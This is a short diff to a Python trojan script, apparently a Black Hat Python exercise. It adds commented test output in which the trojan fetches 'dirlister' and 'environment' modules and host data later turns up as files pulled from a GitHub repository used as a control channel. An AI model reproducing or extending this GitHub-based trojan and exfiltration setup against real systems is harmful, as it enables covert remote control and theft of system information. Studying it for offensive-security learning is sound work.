@@ -101,3 +101,34 @@ if __name__ == '__main__':
     trojan = Trojan('abc')
     trojan.run()        
 
+# Test:
+# python3 git_trojan.py  
+# [*] Attempting to retrieve dirlister
+# [*] Attempting to retrieve environment
+# [*] In dirlister module
+# [*] In environment module
+#
+# -------------------- have trojan run in another tab -------------------- 
+#
+# git pull origin master
+# Username for 'https://github.com': AnLau25
+# Password for 'https://AnLau25@github.com': 
+# remote: Enumerating objects: 11, done. 
+# remote: Counting objects: 100% (11/11), done.
+# remote: Compressing objects: 100% (8/8), done.
+# remote: Total 10 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
+# Unpacking objects: 100% (10/10), 3.57 KiB | 365.00 KiB/s, done.
+# From https://github.com/AnLau25/bhptrojan
+#  * branch            master     -> FETCH_HEAD
+#    494a95e..bb8181c  master     -> origin/master
+# Updating 494a95e..bb8181c
+# Fast-forward
+#  data/abc/2025-06-20T16:09:08.041822.data | 1 +
+#  data/abc/2025-06-20T16:09:15.075340.data | 1 +
+#  2 files changed, 2 insertions(+)
+#  create mode 100644 data/abc/2025-06-20T16:09:08.041822.data
+#  create mode 100644 data/abc/2025-06-20T16:09:15.075340.data
+
+
+
+
